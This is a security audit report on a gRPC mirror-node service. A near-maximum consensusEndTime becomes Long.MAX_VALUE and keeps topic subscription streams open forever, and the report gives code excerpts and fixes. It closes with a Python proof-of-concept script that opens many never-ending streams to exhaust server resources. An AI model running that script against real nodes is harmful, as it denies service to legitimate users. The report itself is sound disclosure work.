# Audit Report

## Title
Unbounded `endTime` in `TopicMessageFilter` Bypasses `pastEndTime` Termination, Enabling Indefinite gRPC Stream Exhaustion

## Summary
An unprivileged caller can submit a `ConsensusTopicQuery` with a near-maximum `consensusEndTime` (seconds ≥ 9,223,372,035), which the server itself converts to `Long.MAX_VALUE`. This value passes the only validation check (`endTime > startTime`), causes `TopicContext.isComplete()` to permanently return `false`, and causes `pastEndTime()` to schedule a recurring Reactor task every 30 seconds that never emits a termination signal. The stream remains open indefinitely. With no global subscription cap enforced, an attacker can open arbitrarily many such streams to exhaust scheduler threads, gRPC stream slots, and heap.

## Finding Description

**1. Validation gap — `TopicMessageFilter.isValidEndTime()`**

`isValidEndTime()` only checks that `endTime > startTime`:

```java
// TopicMessageFilter.java, lines 43–46
@AssertTrue(message = "End time must be after start time")
public boolean isValidEndTime() {
    return endTime == null || endTime > startTime;
}
```

`Long.MAX_VALUE` (9,223,372,036,854,775,807 ns ≈ year 2262) trivially satisfies this. No upper-bound constraint exists.

**2. Server-side production of `Long.MAX_VALUE` — `ConsensusController.convertTimestamp()`**

The controller itself maps any timestamp with `seconds >= 9_223_372_035L` to `Long.MAX_VALUE`:

```java
// ConsensusController.java, lines 76–81
private long convertTimestamp(Timestamp timestamp) {
    if (timestamp.getSeconds() >= 9223372035L) {
        return Long.MAX_VALUE;
    }
    return DomainUtils.timestampInNanosMax(timestamp);
}
```

This means the problematic value is a first-class, reachable code path — not an edge case requiring special knowledge.

**3. `TopicContext.isComplete()` permanently returns `false`**

```java
// TopicMessageServiceImpl.java, lines 203–214
boolean isComplete() {
    if (filter.getEndTime() == null) { return false; }
    if (filter.getEndTime() < startTime) { return true; }
    return Instant.ofEpochSecond(0, filter.getEndTime())
            .plus(grpcProperties.getEndTimeInterval())
            .isBefore(Instant.now());
}
```

`Instant.ofEpochSecond(0, Long.MAX_VALUE)` resolves to year 2262. Adding `endTimeInterval` (30 s) still yields year 2262. `.isBefore(Instant.now())` is permanently `false` for any current time.

**4. `pastEndTime()` never emits a termination signal**

```java
// TopicMessageServiceImpl.java, lines 123–131
private Flux<Object> pastEndTime(TopicContext topicContext) {
    if (topicContext.getFilter().getEndTime() == null) {
        return Flux.never();
    }
    return Flux.empty()
            .repeatWhen(RepeatSpec.create(r -> !topicContext.isComplete(), Long.MAX_VALUE)
                    .withFixedDelay(grpcProperties.getEndTimeInterval()));
}
```

With `endTime = Long.MAX_VALUE`, the non-null branch is taken. The predicate `!topicContext.isComplete()` is always `true`, so the `Flux.empty()` repeats every 30 s indefinitely without ever emitting an item. `takeUntilOther(pastEndTime(...))` at line 73 therefore never fires.

**5. No global subscription cap**

`subscriberCount` at line 48 is registered only as a Micrometer `Gauge` metric. There is no enforcement gate that rejects new subscriptions when a threshold is reached. `maxConcurrentCallsPerConnection = 5` limits per-connection concurrency but not the total number of connections.

## Impact Explanation

Each subscription with `endTime = Long.MAX_VALUE` and no `limit`:
- Holds a gRPC server stream open indefinitely, consuming a stream slot.
- Schedules a recurring task every 30 s on the Reactor `boundedElastic` scheduler to poll `isComplete()`.
- Retains heap for the `TopicContext`, the full Reactor operator chain, and associated state.

An attacker opening N connections × 5 streams each creates 5N permanently open subscriptions. At sufficient scale this exhausts the `boundedElastic` scheduler thread pool, gRPC stream slots, and heap, degrading or denying service to legitimate HCS subscribers. The gRPC service is the primary interface for HCS topic subscriptions, so degradation here directly impacts network observability.

## Likelihood Explanation

No authentication is required to call `subscribeTopic`. The gRPC port (default 5600) is publicly accessible. The exploit requires only a standard gRPC client (e.g., `grpcurl` or the Hedera SDK) and the ability to open multiple TCP connections. The trigger value (`seconds >= 9_223_372_035`) is a single integer field and is trivially scriptable from a single machine or botnet.

## Recommendation

1. **Add an upper-bound constraint on `endTime`** in `TopicMessageFilter.isValidEndTime()`. Reject any `endTime` beyond a reasonable horizon (e.g., current time + some configurable maximum window such as 1 year).

2. **Handle `Long.MAX_VALUE` explicitly in `isComplete()`**. If `filter.getEndTime() == Long.MAX_VALUE`, treat it as "no end time" (return `false` and route to `Flux.never()` in `pastEndTime()`), or reject it at validation time.

3. **Enforce a global subscription cap**. Convert `subscriberCount` from a metric-only gauge into an enforcement gate: reject new subscriptions with a gRPC `RESOURCE_EXHAUSTED` status when the count exceeds a configurable maximum.

4. **Add a per-subscription idle/max-duration timeout**. Regardless of `endTime`, terminate streams that have been open beyond a configurable maximum duration.

## Proof of Concept

```python
import grpc
from proto import consensus_service_pb2_grpc, consensus_service_pb2
from proto import timestamp_pb2, basic_types_pb2

# seconds >= 9_223_372_035 triggers Long.MAX_VALUE in convertTimestamp()
MAX_END = timestamp_pb2.Timestamp(seconds=9_223_372_035, nanos=0)

def open_stream(channel):
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        consensusEndTime=MAX_END,
    )
    # This stream never terminates; pastEndTime() never fires
    for _ in stub.subscribeTopic(query):
        pass

# Open N connections × 5 streams each
channels = [grpc.insecure_channel("mirror-node:5600") for _ in range(N)]
threads = [threading.Thread(target=open_stream, args=(ch,)) for ch in channels for _ in range(5)]
for t in threads:
    t.start()
# All 5N streams remain open indefinitely, each polling isComplete() every 30s
```

Each stream is permanently open because `isComplete()` returns `false` for `endTime = Long.MAX_VALUE`, `pastEndTime()` never emits, and `takeUntilOther` never fires.
